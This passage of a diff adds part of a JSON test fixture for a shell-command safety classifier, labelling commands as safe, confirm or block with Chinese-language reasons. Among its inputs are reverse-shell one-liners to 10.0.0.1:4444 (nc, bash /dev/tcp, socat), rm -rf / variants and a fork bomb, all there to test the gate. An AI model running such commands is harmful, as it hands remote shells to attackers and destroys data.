+  {
+   "cmd": "chmod a+w x",
+   "level": "confirm",
+   "reasons": [
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod -R 777 /var/www",
+   "level": "confirm",
+   "reasons": [
+    "遞迴變更權限",
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "nc -e /bin/sh 10.0.0.1 4444",
+   "level": "confirm",
+   "reasons": [
+    "建立反向連線"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+   "level": "confirm",
+   "reasons": [
+    "建立反向連線"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "nohup rm -rf ./x &",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "time rm -rf ./x",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "env FOO=1 rm -rf ./x",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "FOO=1 rm -rf ./x",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "timeout 5 rm -rf ./x",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "busybox rm -rf ./x",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "for f in *.log; do rm -f \"$f\"; done",
+   "level": "confirm",
+   "reasons": [
+    "強制或批次刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "if [ -d x ]; then rm -rf x; fi",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "(cd /tmp && rm -rf cache)",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "{ rm -rf cache; }",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ls || rm -rf cache",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "make && sudo make install",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod 755 x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod u+x x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod g+w x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "curl https://x -o f; sh f",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "curl https://x | tee x.sh",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "curl https://x | perl -pe 's/a/b/'",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "vim x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "vi /etc/hosts",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "nano x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "top",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "htop",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "less /var/log/syslog",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "man rm",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "watch df -h",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "tmux",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "ssh deploy@10.0.0.1",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "ssh -p 2222 -i key host",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "mysql -u root -p",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "psql -U app app",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "sqlite3 app.db",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "mongosh",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "redis-cli -h 10.0.0.1",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "python3",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "node",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "tail -f /var/log/nginx/error.log",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "journalctl -f",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "ping 8.8.8.8",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "apt install nginx",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "docker exec -it web bash",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "git commit",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "git rebase -i HEAD~3",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "crontab -e",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "bash",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "read -p 'x' v",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "ssh host uptime",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ssh -p 2222 host 'df -h'",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "mysql app < dump.sql",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "psql -c \"select 1\"",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "psql -f x.sql",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "sqlite3 app.db 'select 1'",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "redis-cli -h 10.0.0.1 ping",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "python3 script.py",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "python3 -c \"print(1)\"",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "node app.js",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "tail -n 100 x.log",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ping -c 3 8.8.8.8",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "apt install -y nginx",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "apt-get install --yes nginx",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "apt update",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "docker exec web ls",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git commit -m \"x\"",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git rebase main",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "crontab -l",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "bash deploy.sh",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo -i",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "su",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "sudo su",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "cd /tmp\nrm -rf cache",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ls\nrm -rf cache\nrm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除",
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf a\nrm -rf b\nsudo ls\nrm -rf c",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除",
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "# rm -rf /\nls",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "#!/bin/bash\nls",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ls # rm -rf /",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ls #rm -rf /",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo \"# x\" && rm -rf cache",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \\\n  ./dist",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat <<EOF\nrm -rf /\nEOF",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat <<EOF > notes.txt\nhello\nEOF",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "\r\n\r\n",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ls\r\nrm -rf /\r\n",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "$ ls",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "xbomb(){ bomb|bomb& };bomb",
+   "level": "block",
+   "reasons": [
+    "fork bomb（會耗盡系統資源）"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "a(){ a|a& };ab",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo 你好 > /etc/motd",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat 日誌.log | grep 錯誤",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x 2> /etc/err.log",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ls >| /etc/x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "cmd >>> /etc/x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "kill -1 123",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git branch -d old",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git clean -n -d",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "docker compose down --rmi all",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "podman rmi img",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "dmesg -w",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "journalctl --follow -u x",
+   "level": "safe",
+   "reasons": [],
+   "interactive": true
+  },
+  {
+   "cmd": "top -b",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "ping -w 3 h",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "nc -l 8080",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "socat TCP:h:1 EXEC:/bin/sh",
+   "level": "confirm",
+   "reasons": [
+    "建立反向連線"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mount",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "mount /dev/sdb1 /mnt",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "iptables -L -n",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "iptables -nvX",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git -c x=y push --mirror",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo -s",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "sudo -u bob",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "env -i",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "nice -n 5",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "xargs",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "find . -name x -ok rm {} \\;",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo $(echo $(echo $(echo $(echo $(rm -rf /)))))",
+   "level": "confirm",
+   "reasons": [
+    "指令巢狀過深，無法判讀"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bash -c \"bash -c \\\"bash -c \\\\\\\"bash -c \\\\\\\\\\\\\\\"bash -c \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"bash -c \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"bash -c \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"bash -c \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"ls\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\"\\\\\\\"\\\"\"",
+   "level": "confirm",
+   "reasons": [
+    "指令巢狀過深，無法判讀"
+   ],
+   "interactive": false
+  }
+ ],
+ "segments": [
+  {
+   "line": "a && b || c ; d | e & f",
+   "segments": [
+    "a",
+    "b",
+    "c",
+    "d",
+    "e",
+    "f"
+   ]
+  },
+  {
+   "line": "echo 'a && b' && ls",
+   "segments": [
+    "echo 'a && b'",
+    "ls"
+   ]
+  },
+  {
+   "line": "echo \"x; y\" ; ls",
+   "segments": [
+    "echo \"x; y\"",
+    "ls"
+   ]
+  },
+  {
+   "line": "cmd 2>&1 | grep x",
+   "segments": [
+    "cmd 2>&1",
+    "grep x"
+   ]
+  },
+  {
+   "line": "cmd &> /dev/null",
+   "segments": [
+    "cmd &> /dev/null"
+   ]
+  },
+  {
+   "line": "cmd >&2",
+   "segments": [
+    "cmd >&2"
+   ]
+  },
+  {
+   "line": "a |& b",
+   "segments": [
+    "a",
+    "b"
+   ]
+  },
+  {
+   "line": "a ;; b",
+   "segments": [
+    "a",
+    "b"
+   ]
+  },
+  {
+   "line": "find . -exec rm {} \\; && ls",
+   "segments": [
+    "find . -exec rm {} \\;",
+    "ls"
+   ]
+  },
+  {
+   "line": "echo $(ls; pwd) && ls",
+   "segments": [
+    "echo $(ls; pwd)",
+    "ls"
+   ]
+  },
+  {
+   "line": "echo \"$(a && b)\" && c",
+   "segments": [
+    "echo \"$(a && b)\"",
+    "c"
+   ]
+  },
+  {
+   "line": "echo `a; b`; c",
+   "segments": [
+    "echo `a; b`",
+    "c"
+   ]
+  },
+  {
+   "line": "ls # && rm -rf /",
+   "segments": [
+    "ls"
+   ]
+  },
+  {
+   "line": "ls && ",
+   "segments": [
+    "ls"
+   ]
+  },
+  {
+   "line": "",
+   "segments": []
+  }
+ ],
+ "command_word": [
+  {
+   "seg": "ls -la",
+   "word": "ls"
+  },
+  {
+   "seg": "sudo apt update",
+   "word": "apt"
+  },
+  {
+   "seg": "sudo -u www-data php artisan",
+   "word": "php"
+  },
+  {
+   "seg": "doas -u root ls",
+   "word": "ls"
+  },
+  {
+   "seg": "VAR=1 npm run build",
+   "word": "npm"
+  },
+  {
+   "seg": "env -i FOO=1 make",
+   "word": "make"
+  },
+  {
+   "seg": "nohup ./server",
+   "word": "server"
+  },
+  {
+   "seg": "time ls",
+   "word": "ls"
+  },
+  {
+   "seg": "time -p ls",
+   "word": "ls"
+  },
+  {
+   "seg": "nice -n 10 tar czf x",
+   "word": "tar"
+  },
+  {
+   "seg": "timeout 5s curl x",
+   "word": "curl"
+  },
+  {
+   "seg": "exec rm -rf x",
+   "word": "rm"
+  },
+  {
+   "seg": "setsid -f sleep 1",
+   "word": "sleep"
+  },
+  {
+   "seg": "xargs -0 rm",
+   "word": "rm"
+  },
+  {
+   "seg": "su -c 'rm -rf /'",
+   "word": "rm"
+  },
+  {
+   "seg": "su - deploy -c 'cd x && ls'",
+   "word": "cd"
+  },
+  {
+   "seg": "bash -c \"cd x && rm y\"",
+   "word": "cd"
+  },
+  {
+   "seg": "/usr/bin/rm -rf x",
+   "word": "rm"
+  },
+  {
+   "seg": "\\rm x",
+   "word": "rm"
+  },
+  {
+   "seg": "{ rm x; }",
+   "word": "rm"
+  },
+  {
+   "seg": "(cd x",
+   "word": "cd"
+  },
+  {
+   "seg": "! grep x f",
+   "word": "grep"
+  },
+  {
+   "seg": "if grep -q x f",
+   "word": "grep"
+  },
+  {
+   "seg": "command -v rm",
+   "word": ""
+  },
+  {
+   "seg": "sudo",
+   "word": ""
+  },
+  {
+   "seg": "FOO=1",
+   "word": ""
+  },
+  {
+   "seg": "",
+   "word": ""
+  }
+ ]
+}
